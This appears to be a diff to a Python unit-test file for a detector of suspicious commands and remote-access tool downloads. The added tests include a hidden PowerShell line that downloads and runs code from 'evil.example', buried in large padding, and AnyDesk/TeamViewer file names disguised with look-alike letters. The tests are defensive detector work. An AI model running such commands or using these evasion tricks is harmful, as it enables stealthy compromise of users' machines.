@@ -32,6 +32,15 @@ VCVARS = (
 
 # (file name, host) -> the tool that should be named.
 TOOL_HITS = [
+    # Pass 2, T3: other program types, no ending, look-alike letters.
+    ("AnyDesk.scr", "", "AnyDesk"),
+    ("AnyDesk.com", "", "AnyDesk"),
+    ("AnyDesk.iso", "", "AnyDesk"),
+    ("AnyDesk.bat", "", "AnyDesk"),
+    ("AnyDesk", "", "AnyDesk"),
+    ("\u0410nyDesk.exe", "", "AnyDesk"),
+    ("TeamV\u0456ewer_Setup.exe", "", "TeamViewer"),
+    ("\uff21ny\uff24esk.exe", "", "AnyDesk"),
     ("AnyDesk.exe", "", "AnyDesk"),
     ("AnyDesk (1).exe", "", "AnyDesk"),
     ("ANYDESK.EXE", "", "AnyDesk"),
@@ -78,6 +87,8 @@ TOOL_HITS = [
 ]
 
 TOOL_MISSES = [
+    ("notes", ""),
+    ("report.docx", "anydesk.com"),
     ("report.pdf", "anydesk.com"),
     ("anydesk-guide.pdf", ""),
     ("teamviewer notes.txt", ""),
@@ -278,6 +289,45 @@ class GuardMatchers(unittest.TestCase):
         for text, got in zip(COMMANDS, answers, strict=True):
             with self.subTest(text=text[:70]):
                 self.assertEqual(got.strip(), "1")
+
+    def test_padding_does_not_hide_a_command(self):
+        """Item 63. More than 64 KB of blank space or filler around a
+        command still leaves the command at one end."""
+        cmd = 'powershell -w hidden -c "iwr http://evil.example/a | iex"'
+        big = 70 * 1024
+        padded = [
+            " " * big + cmd,
+            cmd + "\n" * big,
+            "\n" * big + cmd + " " * big,
+            "# filler\n" * (big // 9) + cmd,
+            cmd + "\n" + "# filler\n" * (big // 9),
+        ]
+        answers = self.ask([f"cmd\t{hexed(text)}" for text in padded])
+        for i, got in enumerate(answers):
+            with self.subTest(case=i):
+                self.assertEqual(got.strip(), "1")
+
+    def test_padding_on_both_sides_does_not_hide_a_command(self):
+        """Pass 2, S5. A command in the middle of long text is found."""
+        cmd = 'powershell -w hidden -c "iwr http://evil.example/a | iex"'
+        filler = "# filler\n" * (40 * 1024 // 9)
+        nbsp = "\u00a0" * (40 * 1024)
+        padded = [
+            filler + cmd + "\n" + filler,
+            "<# " + "x" * 40000 + " #> " + cmd + " <# " + "x" * 40000 + " #>",
+            nbsp + cmd + nbsp,
+            filler * 10 + cmd + filler * 10,
+        ]
+        answers = self.ask([f"cmd\t{hexed(text)}" for text in padded])
+        for i, got in enumerate(answers):
+            with self.subTest(case=i):
+                self.assertEqual(got.strip(), "1")
+
+    def test_long_ordinary_text_is_still_left_alone(self):
+        article = "Some ordinary sentence about the weather today.\n" * 3000
+        blanks = " " * (80 * 1024)
+        answers = self.ask([f"cmd\t{hexed(text)}" for text in (article, blanks)])
+        self.assertEqual([a.strip() for a in answers], ["0", "0"])
 
     def test_normal_copies_do_not_trigger(self):
         answers = self.ask([f"cmd\t{hexed(text)}" for text in NORMAL])
